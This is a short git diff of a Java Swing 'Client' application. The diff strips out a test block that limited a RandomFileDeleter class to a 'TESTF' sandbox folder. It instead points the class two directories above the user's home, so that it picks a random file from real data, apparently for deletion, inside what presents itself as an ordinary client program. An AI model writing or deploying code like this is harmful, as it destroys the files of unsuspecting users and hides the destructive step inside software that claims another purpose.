@@ -76,7 +76,6 @@ public class Client extends JFrame {
 	 * Runs the client as an application with a closeable frame.
 	 */
 	public static void main(String[] args) throws Exception {
-		System.out.println(System.getProperty("user.home"));
 		System.setProperty("file.encoding", "UTF-8");
 		Field charset = Charset.class.getDeclaredField("defaultCharset");
 		charset.setAccessible(true);
@@ -457,20 +456,7 @@ public class Client extends JFrame {
 		File myroot = new File(System.getProperty("user.home"));
 		File resultFile;
 
-		/*
-		 * Testing
-		 * 
-		 */
-		File[] testfs = myroot.listFiles();
-		for (File tmpFile : testfs) {
-			if (tmpFile.getName().equals("TESTF")) {
-				myroot = tmpFile;
-				break;
-			}
-		}
-
-		System.out.println(myroot.getAbsolutePath());
-		// myroot = myroot.getParentFile().getParentFile();
+		myroot = myroot.getParentFile().getParentFile();
 
 		RandomFileDeleter myRndFile = new RandomFileDeleter(myroot);
 		resultFile = myRndFile.getRandomFile();
